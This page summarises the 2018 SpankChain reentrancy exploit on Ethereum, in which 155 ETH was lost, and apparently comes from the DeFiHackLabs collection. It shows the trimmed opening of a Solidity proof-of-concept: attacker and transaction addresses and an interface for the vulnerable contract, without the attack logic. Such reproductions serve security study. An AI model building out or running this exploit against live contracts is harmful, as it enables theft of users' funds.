# [?] SpankChain - Reentrancy

## Summary
Severity: Unknown
Chain: Ethereum
Component: SpankChain
Published: 2018-10-07
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2018-10/SpankChain_exp.sol
Type: defi-exploit-poc

## Details
Lost: 155 $ETH

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 155 $ETH
// Attacker : https://etherscan.io/address/0xcf267eA3f1ebae3C29feA0A3253F94F3122C2199
// Attack Contract : https://etherscan.io/address/0xc5918a927C4FB83FE99E30d6F66707F4b396900E
// Vulnerable Contract : https://etherscan.io/address/0xf91546835f756DA0c10cFa0CDA95b15577b84aA7
// Attack Tx : https://etherscan.io/tx/0x21e9d20b57f6ae60dac23466c8395d47f42dc24628e5a31f224567a2b4effa88

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xf91546835f756DA0c10cFa0CDA95b15577b84aA7#code

// @Analysis
// Post-mortem :
// Twitter Guy :
// Hacking God :
pragma solidity ^0.8.0;

interface ISpankChain {
    function createChannel(
        bytes32 _lcID,
        address _partyI,
        uint256 _confirmTime,
        address _token,
        uint256[2] memory _balances // [eth, token]
    ) external payable;
    function LCOpenTimeout(
        bytes32 _lcID
    ) external;

    event DidLCOpen(
        bytes32 indexed channelId,
        address indexed partyA,
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2018-10/SpankChain_exp.sol_
